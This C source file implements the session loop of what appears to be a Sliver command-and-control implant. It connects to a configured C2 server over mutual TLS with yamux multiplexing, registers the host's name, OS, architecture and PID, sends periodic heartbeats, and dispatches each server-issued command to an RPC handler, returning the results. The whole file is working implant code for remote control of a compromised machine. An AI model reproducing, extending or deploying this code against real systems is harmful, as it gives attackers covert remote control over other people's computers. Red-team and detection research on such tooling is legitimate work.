/* src/modes/session.c - interactive session loop over mtls. */
#include "sliver/session.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/frame.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/rpc.h"
#include "sliver/transport.h"
#include "sliver/yamux.h"

#define SLIVER_HEARTBEAT_INTERVAL_MS 120000u
#define SLIVER_HEARTBEAT_TICK_MS 200u

typedef struct {
  sliver_yamux_t *y;
  uint32_t stream_id;
  int failed;
} session_stream_t;

typedef struct {
  sliver_yamux_t *y;
  sliver_frame_signer_t *signer;
  sliver_mutex_t *tx_lock;
  volatile int stop;
} session_tx_t;

static long stream_read(void *ctx, void *buf, size_t len) {
  session_stream_t *s = (session_stream_t *)ctx;
  long n = sliver_yamux_read(s->y, s->stream_id, buf, len);
  if (n < 0) {
    s->failed = 1;
  }
  return n;
}

static long stream_write(void *ctx, const void *buf, size_t len) {
  session_stream_t *s = (session_stream_t *)ctx;
  if (sliver_yamux_write(s->y, s->stream_id, buf, len) != 0) {
    s->failed = 1;
    return -1;
  }
  return (long)len;
}

static long tls_read(void *ctx, void *buf, size_t len) {
  return sliver_tls_read((sliver_tls_t *)ctx, buf, len);
}

static long tls_write(void *ctx, const void *buf, size_t len) {
  return sliver_tls_write((sliver_tls_t *)ctx, buf, len);
}

/* Writes one signed envelope on a fresh stream and half-closes it. */
static int send_envelope(session_tx_t *tx, const void *envelope, size_t len) {
  session_stream_t stream;
  uint32_t sid = 0;
  int rc;

  if (tx->tx_lock != NULL) {
    sliver_mutex_lock(tx->tx_lock);
  }
  if (sliver_yamux_open(tx->y, &sid) != 0) {
    LOG_ERROR("session: yamux open failed");
    if (tx->tx_lock != NULL) {
      sliver_mutex_unlock(tx->tx_lock);
    }
    return -1;
  }
  stream.y = tx->y;
  stream.stream_id = sid;
  stream.failed = 0;
  rc = sliver_frame_write(tx->signer, stream_write, &stream, envelope, len);
  (void)sliver_yamux_close_write(tx->y, sid);
  if (tx->tx_lock != NULL) {
    sliver_mutex_unlock(tx->tx_lock);
  }
  return rc;
}

/* Envelope{ID, UnknownMessageType = true}. */
static int encode_unknown_reply(sliver_buf_t *out, int64_t id) {
  sliver_buf_init(out);
  if (sliver_buf_put_int64(out, 1, id) != 0) {
    return -1;
  }
  return sliver_buf_put_bool(out, 4, 1);
}

/* Heartbeat: keeps NAT bindings alive and lets the server notice a dead peer. */
static void heartbeat_thread(void *arg) {
  session_tx_t *tx = (session_tx_t *)arg;
  uint32_t waited = 0;

  while (!tx->stop) {
    sliver_sleep_ms(SLIVER_HEARTBEAT_TICK_MS);
    if (tx->stop) {
      break;
    }
    waited += SLIVER_HEARTBEAT_TICK_MS;
    if (waited < SLIVER_HEARTBEAT_INTERVAL_MS) {
      continue;
    }
    waited = 0;
    {
      sliver_buf_t ping;
      sliver_buf_t env;
      sliver_buf_init(&ping);
      sliver_buf_init(&env);
      if (sliver_ping_encode(&ping, 31337) == 0 &&
          sliver_envelope_encode(&env, 0, SLIVER_MSG_PING, ping.data, ping.len) == 0) {
        if (send_envelope(tx, env.data, env.len) != 0) {
          LOG_WARN("session: heartbeat send failed");
        } else {
          LOG_DEBUG("session: heartbeat ping sent");
        }
      }
      sliver_buf_free(&ping);
      sliver_buf_free(&env);
    }
  }
}

int sliver_session_run(const sliver_session_config_t *cfg) {
  sliver_tls_t *tls = NULL;
  sliver_yamux_t yamux;
  sliver_frame_signer_t signer;
  sliver_buf_t reg_buf, env_buf;
  sliver_register_t reg;
  session_tx_t tx;
  sliver_mutex_t *tx_lock = NULL;
  sliver_thread_t *heartbeat = NULL;
  char err[256];
  int rc = -1;
  int yamux_ready = 0;

  if (cfg == NULL || cfg->host == NULL || cfg->ca_pem == NULL ||
      cfg->age_private_key == NULL || cfg->server_minisign_pubkey == NULL) {
    return -1;
  }

  sliver_buf_init(&reg_buf);
  sliver_buf_init(&env_buf);

  if (sliver_frame_signer_init(&signer, cfg->age_private_key) != 0) {
    LOG_ERROR("session: cannot derive envelope signing key");
    return -1;
  }

  err[0] = '\0';
  if (sliver_tls_connect(&tls, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem,
                         cfg->key_pem, err, sizeof(err)) != 0) {
    LOG_ERROR("session: %s", err);
    return -1;
  }
  LOG_INFO("session: handshake ok (%s / %s)", sliver_tls_version(tls),
           sliver_tls_ciphersuite(tls));

  if (sliver_tls_write(tls, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
      SLIVER_YAMUX_PREFACE_LEN) {
    LOG_ERROR("session: MUX/1 write failed");
    goto out;
  }
  if (sliver_yamux_client(&yamux, tls_read, tls_write, tls) != 0) {
    goto out;
  }
  yamux_ready = 1;

  tx_lock = sliver_mutex_create();
  tx.y = &yamux;
  tx.signer = &signer;
  tx.tx_lock = tx_lock;
  tx.stop = 0;

  /* Register: Envelope{Type = MsgRegister, Data = Register}. */
  reg = cfg->reg;
  (void)snprintf(reg.active_c2, sizeof(reg.active_c2), "mtls://%s:%u", cfg->host,
                 (unsigned)cfg->port);
  if (sliver_register_encode(&reg_buf, &reg) != 0 ||
      sliver_envelope_encode(&env_buf, 0, SLIVER_MSG_REGISTER, reg_buf.data,
                             reg_buf.len) != 0) {
    LOG_ERROR("session: cannot encode register");
    goto out;
  }
  if (send_envelope(&tx, env_buf.data, env_buf.len) != 0) {
    LOG_ERROR("session: register send failed");
    goto out;
  }
  sliver_buf_free(&env_buf);
  sliver_buf_init(&env_buf);
  LOG_INFO("session: registered as %s (%s/%s, pid %d)", reg.name, reg.os, reg.arch,
           reg.pid);

  heartbeat = sliver_thread_create(heartbeat_thread, &tx);

  /* Serve server initiated streams until the connection dies. */
  for (;;) {
    uint32_t sid = 0;
    session_stream_t stream;
    sliver_envelope_t envelope;
    sliver_rpc_result_t result;

    if (sliver_yamux_accept(&yamux, &sid) != 0) {
      LOG_INFO("session: connection closed");
      rc = 0;
      break;
    }
    stream.y = &yamux;
    stream.stream_id = sid;
    stream.failed = 0;

    if (sliver_frame_read(cfg->server_minisign_pubkey, stream_read, &stream, &env_buf) != 0) {
      LOG_WARN("session: bad frame on stream %u", sid);
      (void)sliver_yamux_close_write(&yamux, sid);
      continue;
    }
    if (sliver_envelope_decode(env_buf.data, env_buf.len, &envelope) != 0) {
      LOG_WARN("session: bad envelope on stream %u", sid);
      sliver_buf_free(&env_buf);
      sliver_buf_init(&env_buf);
      (void)sliver_yamux_close_write(&yamux, sid);
      continue;
    }

    if (envelope.type == SLIVER_MSG_PING) {
      int32_t nonce = 0;
      (void)sliver_ping_decode_nonce(envelope.data, envelope.data_len, &nonce);
      LOG_DEBUG("session: ping from server (nonce %d)", nonce);
    } else {
      sliver_rpc_dispatch(&envelope, &result);
      if (result.handled) {
        sliver_buf_t reply;
        sliver_buf_init(&reply);
        if (sliver_envelope_encode(&reply, envelope.id, result.resp_type,
                                   result.message.data, result.message.len) == 0 &&
            send_envelope(&tx, reply.data, reply.len) == 0) {
          LOG_DEBUG("session: handled type %u -> %u (%u bytes)", envelope.type,
                    result.resp_type, (unsigned)result.message.len);
        } else {
          LOG_WARN("session: response send failed for type %u", envelope.type);
        }
        sliver_buf_free(&reply);
        sliver_rpc_result_free(&result);
      } else {
        sliver_buf_t reply;
        LOG_INFO("session: unsupported message type %u, sending UnknownMessageType",
                 envelope.type);
        if (encode_unknown_reply(&reply, envelope.id) == 0) {
          if (send_envelope(&tx, reply.data, reply.len) != 0) {
            LOG_ERROR("session: unknown-type reply send failed");
          } else {
            LOG_DEBUG("session: unknown-type reply sent (%u bytes)", (unsigned)reply.len);
          }
          sliver_buf_free(&reply);
        }
      }
    }
    sliver_buf_free(&env_buf);
    sliver_buf_init(&env_buf);
    (void)sliver_yamux_close_write(&yamux, sid);
  }

out:
  tx.stop = 1;
  if (heartbeat != NULL) {
    (void)sliver_thread_join(heartbeat);
    heartbeat = NULL;
  }
  if (tx_lock != NULL) {
    sliver_mutex_destroy(tx_lock);
  }
  sliver_buf_free(&reg_buf);
  sliver_buf_free(&env_buf);
  if (yamux_ready) {
    sliver_yamux_free(&yamux);
  }
  if (tls != NULL) {
    sliver_tls_close(tls);
  }
  return rc;
}


